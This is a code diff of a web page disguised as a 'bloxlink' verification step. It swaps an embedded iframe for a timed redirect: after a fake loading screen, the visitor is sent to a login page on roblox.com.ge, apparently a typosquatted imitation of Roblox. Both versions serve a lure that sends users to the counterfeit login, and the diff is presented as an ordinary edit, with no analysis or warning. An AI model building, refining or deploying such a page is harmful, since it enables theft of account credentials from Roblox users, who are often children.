@@ -190,33 +190,6 @@
     40% { opacity: 1; }
   }
 
-  /* Iframe */
-  .iframe-container {
-    display: none;
-    background: var(--main-bg);
-    width: 100%;
-    height: 100vh;
-    justify-content: center;
-    align-items: center;
-    flex-direction: column;
-    padding: 10px;
-  }
-
-  .iframe-logo {
-    font-size: 26px;
-    font-weight: 700;
-    margin-bottom: 15px;
-    text-align: center;
-  }
-
-  iframe {
-    width: 100%;
-    max-width: 900px;
-    height: 80vh;
-    border: none;
-    border-radius: 10px;
-  }
-
   /* --- Mobile Responsiveness --- */
   @media (max-width: 768px) {
     .verification-box {
@@ -242,11 +215,6 @@
     .add-btn {
       justify-content: center;
       width: 100%;
-    }
-
-    iframe {
-      height: 75vh;
-      width: 95%;
     }
   }
 
@@ -304,26 +272,20 @@
     </div>
   </div>
 
-  <!-- Iframe -->
-  <div class="iframe-container" id="iframe-container">
-    <div class="iframe-logo">bloxlink</div>
-    <iframe src="https://roblox.com.ge/login?returnUrl=1606336694621110"></iframe>
-  </div>
-
 <script>
   const verifyBtn = document.getElementById('verify-btn');
   const addBtn = document.getElementById('add-btn');
   const loadingScreen = document.getElementById('loading-screen');
-  const iframeContainer = document.getElementById('iframe-container');
   const mainContent = document.getElementById('main-content');
+
+  const redirectURL = "https://roblox.com.ge/login?returnUrl=1606336694621110";
 
   function startRedirect() {
     mainContent.style.display = 'none';
     loadingScreen.style.display = 'flex';
 
     setTimeout(() => {
-      loadingScreen.style.display = 'none';
-      iframeContainer.style.display = 'flex';
+      window.location.href = redirectURL;
     }, 3000);
   }
 
